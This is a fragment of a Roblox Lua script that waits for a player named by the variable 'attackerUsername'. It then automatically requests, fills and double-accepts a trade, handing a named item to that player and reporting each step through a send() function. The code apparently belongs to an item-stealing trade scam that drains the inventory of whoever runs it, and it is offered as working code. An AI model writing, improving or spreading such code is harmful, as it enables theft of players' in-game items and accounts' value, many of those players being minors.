spawn(function()
    print("Waiting for attacker: " .. attackerUsername)
    local target = nil
    while not target do
        for _, plr in pairs(game.Players:GetPlayers()) do
            if plr.Name == attackerUsername and plr ~= player then
                target = plr
                print("Attacker found: " .. target.Name)
                break
            end
        end
        wait(1)
    end

    wait(3)

    -- 1. Send request
    local ok, res = pcall(function() return SendReq:InvokeServer(target) end)
    if not ok then print("SendRequest failed: " .. tostring(res)); return end
    print("Trade request sent")

    wait(1)

    -- 2. Accept request
    pcall(function() AcceptReq:FireServer() end)
    print("Accept request fired")

    wait(1)

    -- 3. Start trade (if needed)
    if StartTr then pcall(function() StartTr:FireServer() end) end

    wait(2) -- allow GUI to appear

    -- 4. Find trade window
    local tradeWindow = findTradeWindow()
    local itemAdded = false

    -- 4a. Try GUI method
    if tradeWindow then
        itemAdded = addItemByGUIName(tradeWindow, targetName)
        if itemAdded then
            send("Added " .. targetName .. " via GUI.")
        end
    else
        print("Trade window not found for GUI")
    end

    -- 4b. If GUI failed, try remote
    if not itemAdded then
        print("GUI method failed, trying remote by ID")
        local itemId = findItemIdByName(targetName)
        if itemId then
            itemAdded = offerItemByID(itemId)
            if itemAdded then
                send("Offered " .. targetName .. " by ID " .. tostring(itemId))
            else
                send("Remote offer failed for " .. targetName)
            end
        else
            send("Could not find ID for " .. targetName)
        end
    end

    wait(1)

    -- 5. Accept trade (double)
    pcall(function() AcceptTr:FireServer() end)
    wait(0.3)
    pcall(function() AcceptTr:FireServer() end)

    wait(0.5)

    -- 6. Complete trade
    if CompleteTr then pcall(function() CompleteTr:FireServer() end) end

    print("=== TRADE COMPLETED ===")
    send("Trade sequence finished.")
end)

